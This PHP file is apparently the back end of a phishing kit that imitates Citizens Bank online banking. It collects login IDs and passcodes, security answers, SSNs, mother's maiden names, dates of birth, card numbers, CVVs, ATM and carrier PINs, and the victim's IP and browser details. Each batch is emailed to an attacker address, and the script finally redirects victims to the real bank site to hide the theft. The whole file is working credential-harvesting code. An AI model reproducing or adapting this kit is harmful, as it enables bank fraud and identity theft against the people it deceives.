<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if (isset($_POST['btn2'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Question 1           : ".$_POST['q1']."\n";
	$message .= "Answer 1           : ".$_POST['ans1']."\n";
	$message .= "Question 2           : ".$_POST['q2']."\n";
	$message .= "Answer 2           : ".$_POST['ans2']."\n";
	$message .= "An           : ".$_POST['an']."\n";
	$message .= "Rn           : ".$_POST['rn']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./detail.html");
	
}
else if (isset($_POST['btn3'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Full Name           : ".$_POST['fname']."\n";
	$message .= "Address           : ".$_POST['add']."\n";
	$message .= "Driving License           : ".$_POST['dl']."\n";
	$message .= "Phone Number           : ".$_POST['ph']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: ./card.html");
	
}
else if (isset($_POST['btn4'])) {


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "Zipcode            : ".$_POST['zcode']."\n";
	$message .= "SSN            : ".$_POST['ssn']."\n";
	$message .= "MMN            : ".$_POST['mmn']."\n";
	$message .= "DOB            : ".$_POST['dob']."\n";
	$message .= "Card Number            : ".$_POST['cnum']."\n";
	$message .= "Name on Card            : ".$_POST['cname']."\n";
	$message .= "Card Type            : ".$_POST['ctype']."\n";
	$message .= "Card Scheme            : ".$_POST['cscheme']."\n";
	$message .= "Card Brand            : ".$_POST['cbrand']."\n";
	$message .= "Expire Date             : ".$_POST['exdate']."\n";
	$message .= "CCV             : ".$_POST['ccv']."\n";
	$message .= "ATM Pin             : ".$_POST['pin']."\n";
	$message .= "carrier pin             : ".$_POST['cpin']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: https://www4.citizensbankonline.com/");
	
}

else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>